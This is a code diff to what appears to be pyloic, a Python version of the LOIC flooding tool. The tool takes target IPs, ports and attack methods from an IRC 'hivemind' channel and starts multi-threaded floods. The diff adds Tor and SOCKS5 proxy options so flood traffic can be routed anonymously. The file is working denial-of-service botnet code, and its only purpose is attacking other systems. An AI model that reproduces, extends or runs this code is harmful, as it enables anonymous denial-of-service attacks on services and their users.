@@ -1,4 +1,4 @@
-import sys, socket, string, random, os, time
+import getopt, sys, socket, string, random, os, time
 from Core.Events import *
 from Core.IRC import * 
 from Core.Flooder import *
@@ -19,7 +19,8 @@ random = None
 speed = None
 srchost = None
 srcport = None
-
+socks5ip = "127.0.0.1"
+socks5port = 9050
 
 def lazerParseHook(event):
     global status, flooder, targetip, timeout, subsite, message, port, method, threads, wait, random, speed, srchost, srcport
@@ -121,7 +122,7 @@ def lazerParseHook(event):
         status = WAITING
 
 def lazerStartHook(event):
-    global status, flooder, targetip, timeout, subsite, message, port, method, threads, wait, random, speed
+    global status, flooder, targetip, timeout, subsite, message, port, method, threads, wait, random, speed, srchost, srcport, socks5ip, socks5port
     print "FIRING MAH LAZ000000R!"
     if status == START:
         if flooder != None:
@@ -141,7 +142,7 @@ def lazerStartHook(event):
             print "Missing required thread amount"
             return
 
-        flooder = Flooder(targetip, port, timeout, method, threads, subsite, message, random, wait, srchost, srcport)
+        flooder = Flooder(targetip, port, timeout, method, threads, subsite, message, random, wait, srchost, srcport, socks5ip, socks5port)
         flooder.start()
 
 irc = None
@@ -153,22 +154,36 @@ def restartIRCHook(event):
     irc.connect()
 
 def main(args):
-    global irc, flooder
+    global irc, flooder, socks5ip, socks5port
 
-    listener = Listener(LAZER_RECV, lazerParseHook)
-    getEventManager().addListener(listener)
-    listener = Listener(START_LAZER, lazerStartHook)
-    getEventManager().addListener(listener)
-    listener = Listener(IRC_RESTART, restartIRCHook)
-    getEventManager().addListener(listener)
+    getEventManager().addListener(LAZER_RECV, lazerParseHook)
+    getEventManager().addListener(START_LAZER, lazerStartHook)
+    getEventManager().addListener(IRC_RESTART, restartIRCHook)
 
     try:
         host = args[1]
         port = int(args[2])
         channel = args[3]
-    except:
-        print "usage: pyloic <hivemind irc server> <irc port> <irc channel>"
+        if len(args[4:]):
+            try:
+                opts, argv = getopt.getopt(args[4:], "ts:", ["tor","socks5="])
+            except getopt.GetoptError:
+                print "Usage: python main.py <hivemind irc server> <irc port> <irc channel> [--tor] [--socks5=ip:port]"
+                sys.exit()
+
+            for o, a in opts:
+                if o in ("-t", "--tor"):
+                    socks5ip = "127.0.0.1"
+                    socks5port = 9050
+                elif o in ("-s", "--socks5"):
+                    socks5 = a.split(':')
+                    socks5ip = socket.gethostbyname(socks5[0])
+                    socks5port = int(socks5[1])
+
+    except getopt.GetoptError:
+        print "Usage: python main.py <hivemind irc server> <irc port> <irc channel> [--tor] [--socks5=ip:port]"
         sys.exit()
+
     if channel[0] != '#':
         channel = '#' + channel
 
